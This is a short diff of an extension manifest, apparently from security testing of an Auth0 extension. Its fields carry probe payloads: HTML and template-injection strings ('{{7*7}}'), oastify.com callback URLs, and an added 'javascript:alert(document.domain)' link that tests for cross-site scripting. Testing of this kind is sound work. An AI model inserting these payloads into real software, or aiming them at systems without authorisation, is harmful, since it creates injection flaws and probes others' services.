@@ -8,7 +8,7 @@
       "This is a test extension <u>test</u> {{7*7}}",
     "type": "application",
     "logoUrl": "https://l5rxhj1h3jk0eg38q7obyuuo1f76v4jt.oastify.com/logo.svg",
-    "docsUrl": "https://j5pvhh1f3hkyee36q5o9ysum1d74v3js.oastify.com/docs",
+    "docsUrl": "javascript:alert(document.domain)",
     "initialUrlPath": "/login",
     "repository": "https://e5kqhc1a3ckte931q0o4ynuh187zvzjo.oastify.com/repo",
     "keywords": ["auth0", "extension", "<u>test</u>", "{{7*7}}"],
